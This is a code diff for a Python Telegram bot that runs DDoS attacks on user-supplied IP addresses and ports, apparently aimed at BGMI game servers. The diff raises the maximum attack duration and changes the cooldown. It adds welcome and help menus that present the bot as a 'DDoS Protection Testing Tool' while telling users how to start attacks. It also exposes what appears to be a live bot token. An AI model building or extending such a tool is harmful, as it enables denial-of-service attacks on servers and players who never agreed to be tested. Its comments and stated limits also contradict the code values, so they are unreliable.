@@ -10,6 +10,7 @@ from PIL import Image
 import imagehash
 import time
 import requests
+from telebot import TeleBot, types
 from requests.exceptions import ReadTimeout
 
 # Initialize logging
@@ -17,8 +18,8 @@ logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s
 
 # Telegram bot token and channel IDs
 TOKEN = '7788865701:AAHg0Ii5mPeIJcReFzGgSg_4qFaN8pF9ArQ'  # Replace with your actual bot token
-CHANNEL_ID = '-1002287609881'  # Replace with your specific channel or group ID for attacks
-FEEDBACK_CHANNEL_ID = '-1002294913266'  # Replace with your specific channel ID for feedback
+CHANNEL_ID = '-1002298552334'  # Replace with your specific channel or group ID for attacks
+FEEDBACK_CHANNEL_ID = '-1002124760113'  # Replace with your specific channel ID for feedback
 message_queue = []
 
 
@@ -42,12 +43,12 @@ pending_feedback = set()
 reset_time = datetime.now().astimezone(timezone(timedelta(hours=5, minutes=30))).replace(hour=0, minute=0, second=0, microsecond=0)
 
 # Configuration
-COOLDOWN_DURATION = 60  # 1 minute cooldown
+COOLDOWN_DURATION = 180  # 1 minute cooldown
 BAN_DURATION = timedelta(hours=1)  # 1 hour ban for invalid feedback
 DAILY_ATTACK_LIMIT = 5000
 EXEMPTED_USERS = [7163028849, 7184121244]
 # Configuration
-MAX_ATTACK_DURATION = 10  # Maximum attack duration in seconds (e.g., 300 seconds = 5 minutes)
+MAX_ATTACK_DURATION = 60  # Maximum attack duration in seconds (e.g., 300 seconds = 5 minutes)
 
 def sanitize_filename(filename):
     """Sanitize filenames to prevent path traversal."""
@@ -187,7 +188,7 @@ def bgmi_command(message):
     try:
         args = message.text.split()[1:]
         if len(args) != 3:
-            raise ValueError("Usage: /attack <IP> <PORT> <DURATION>")
+            raise ValueError("Usage: /bgmi <IP> <PORT> <DURATION>")
 
         ip, port, duration = args
         if not (ip.count('.') == 3 and all(0<=int(p)<=255 for p in ip.split('.'))):
@@ -230,7 +231,7 @@ def bgmi_command(message):
         asyncio.run(execute_attack(ip, port, duration, message.from_user.first_name))
 
     except Exception as e:
-        bot.reply_to(message, f"❌ Error: {str(e)}")
+        bot.reply_to(message, f"⚠️ Note: {str(e)}")
         logging.error(f"Attack error: {str(e)}")
     finally:
         attack_in_progress = False
@@ -263,6 +264,89 @@ async def execute_attack(ip, port, duration, username):
         if proc and proc.returncode is None:
             proc.terminate()
             await proc.wait()
+
+@bot.callback_query_handler(func=lambda call: call.data == "start_bgmi")
+def callback_query(call):
+    bot.answer_callback_query(call.id)  # Acknowledge the callback
+    bot.send_message(call.message.chat.id, "Please type /bgmi in the chat to continue.")
+
+
+
+@bot.message_handler(commands=['start'])
+def send_welcome(message):
+    welcome_text = """
+    🚀 *Welcome to BGMI Attack Bot* 🛡️
+    
+    *_A Powerful DDoS Protection Testing Tool_*
+    
+    📌 *Quick Start Guide*
+    1️⃣ Use /bgmi command to start attack
+    2️⃣ Follow format: /bgmi IP PORT TIME
+    3️⃣ Provide feedback after each attack
+    
+    ⚠️ *Rules*
+    - Max attack time: 1 minutes ⏳
+    - Daily limit: 15 attacks 📊
+    - Banned for fake feedback 🚫
+    
+    🔗 Support: @titanddos24op
+    🔰 Owner : @Titanop24
+    """
+    
+    # Add quick action buttons
+    markup = telebot.types.InlineKeyboardMarkup()
+    markup.add(
+        telebot.types.InlineKeyboardButton("⚡ Start Attack", callback_data='start_bgmi'),
+        telebot.types.InlineKeyboardButton("📚 Tutorial", url='https://t.me/titanddos24op')
+    )
+    
+    bot.send_message(
+        message.chat.id,
+        welcome_text,
+        parse_mode='Markdown',
+        reply_markup=markup
+    )
+
+@bot.message_handler(commands=['help'])
+def send_help(message):
+    help_text = """
+    🔧 *BGMI Bot Help Center* 🛠️
+    
+    📝 *Available Commands*
+    /start - Show welcome message 🌟
+    /bgmi - Start attack 🚀
+    /help - Show this help message ❓
+    
+    🎯 *Attack Format*
+    `/bgmi 1.1.1.1 80 60`
+    - IP: Target IP address 🌐
+    - Port: Target port 🔌
+    - Time: Attack duration in seconds ⏱️
+    
+    🛡️ *Safety Features*
+    - Auto-cooldown: 1 minute between attacks ⏳
+    - Feedback system: Photo verification required 📸
+    - Attack limits: Prevents abuse 🛑
+    
+    📌 *Need Help?*
+    Contact support: @titanddos24op
+    Report issues: @Titanop24
+    """
+    
+    # Add support buttons
+    markup = telebot.types.InlineKeyboardMarkup()
+    markup.add(
+        telebot.types.InlineKeyboardButton("🆘 Immediate Support", url='t.me/Titanop24'),
+        telebot.types.InlineKeyboardButton("📘 Documentation", url='https://t.me/titanddos24op')
+    )
+    
+    bot.send_message(
+        message.chat.id,
+        help_text,
+        parse_mode='Markdown',
+        reply_markup=markup
+    )
+
 # Modified message sending with retry logic
 def send_message_with_retry(chat_id, text, retries=3):
     for attempt in range(retries):
